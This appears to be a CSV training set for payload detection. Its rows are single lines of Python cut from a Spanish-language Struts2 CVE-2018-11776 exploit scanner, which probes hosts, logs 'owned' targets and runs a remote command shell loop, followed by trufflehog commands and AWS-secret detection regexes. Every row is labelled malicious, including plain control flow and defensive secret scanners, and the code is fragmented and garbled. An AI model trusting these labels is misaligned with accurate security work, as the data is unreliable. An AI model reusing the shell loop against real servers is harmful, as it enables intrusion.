Payload,Signature,AttackType,Severity,MITRE,Label,Description
                    else:,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
                        x = len(validador()),CMDi_Unix,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
                else:,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"                    print(BLUE+""     [-] NO VULNERABLE ""+ENDC + ""Payload: "" + str(x))",GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
            except:,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
                pass,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
            x=x+1,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
        # CVE-2018-11776 ---------------------------------------------------------------------------------,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"        print(BLUE+""     [-] NO VULNERABLE""+ENDC)",GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"        print(BOLD+"" [+] EJECUTANDO EXPLOIT CVE-2018-11776""+ENDC)",GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
        x = 0,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
        while x < len(validador()):,CMDi_Unix,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
            #Filtramos la url solo dominio,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
            if ('://' not in url):,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
            scheme = urllib.parse.urlparse(url).scheme,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
            site = scheme + '://' + urllib.parse.urlparse(url).netloc,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
            #Filtramos la url solo path,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
            file_path = urllib.parse.urlparse(url).path,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
            if (file_path == ''):,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
                file_path = '/',GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
            valida = validador()[x],CMDi_Unix,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
            try:,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"                result = requests.get(site+""/""+exploit3(str(valida))+file_path).text",CMDi_Unix,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"                if result.find(""ASCII"") != -1 or result.find(""No such"") != -1 or result.find(""Directory of"") != -1 or result.find(""Volume Serial"") != -1 or result.find(""inet"") != -1 or result.find(""root:"") != -1 or result.find(""uid="") != -1 or result.find(""accounts"") != -1 or result.find(""Cuentas"") != -1:",CMDi_Unix,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"                    print(RED+""   [-] VULNERABLE""+ENDC)",GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
                    owned.write(str(host)+'\n'),GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
                    owned.close(),GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"                    opcion = input(YELLOW+""   [-] RUN THIS EXPLOIT (s/n): ""+ENDC)",GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
                    if opcion == 's':,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"                        print(YELLOW+""   [-] GET PROMPT...\n""+ENDC)",DirTraversal_Path,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
                        time.sleep(1),GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"                        print(BOLD+""   * [UPLOAD SHELL]""+ENDC)",GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"                        print(OTRO+""     Struts@Shell:$ pwnd (php)\n""+ENDC)",GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
                        while 1:,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"                            separador = input(GREEN+""Struts2@Shell_3:$ ""+ENDC)",GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
                            espacio = separador.split(' '),GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"                            comando = ""%20"".join(espacio)",GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
                            shell = urllib.request.urlopen(host+exploit3(str(comando))),GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"                            print(""\n""+shell.read())",GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
                    else:,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
                        x = len(validador()),CMDi_Unix,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
                        exit(0),GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
                else:,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"                    print(BLUE+""     [-] NO VULNERABLE ""+ENDC + ""Payload: "" + str(x))",GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
            except:,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
                pass,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
            x=x+1,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
    else:,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"        print(RED+"" Debe introducir el protocolo (https o http) para el dominio\n""+ENDC)",GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
        exit(0),GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
else:,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"    print(RED+"" Debe Ingresar una Url\n""+ENDC)",GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
    exit(0),GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
# Example of hardcoded API key,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
## Scan a Github Organization,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"docker run --rm -it -v ""$PWD:/pwd"" trufflesecurity/trufflehog:latest github --org=trufflesecurity",CMDi_Unix,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
# Scan a Docker image for verified secrets,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"docker run --rm -it -v ""$PWD:/pwd"" trufflesecurity/trufflehog:latest docker --image trufflesecurity/secrets",CMDi_Unix,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
patterns:,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
- pattern:,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
name: AWS API Gateway,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
regex: '[0-9a-z]+.execute-api.[0-9a-z._-]+.amazonaws.com',GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
confidence: low,CMDi_Unix,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
- pattern:,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
name: AWS API Key,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
regex: AKIA[0-9A-Z]{16},GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
confidence: high,CMDi_Unix,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
rev: v3.2.0,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
hooks:,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
-   id: detect-aws-credentials,CMDi_Unix,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
-   id: detect-private-key,CMDi_Unix,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"    """,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"    """,CMDi_Unix,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"    """,CMDi_Unix,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
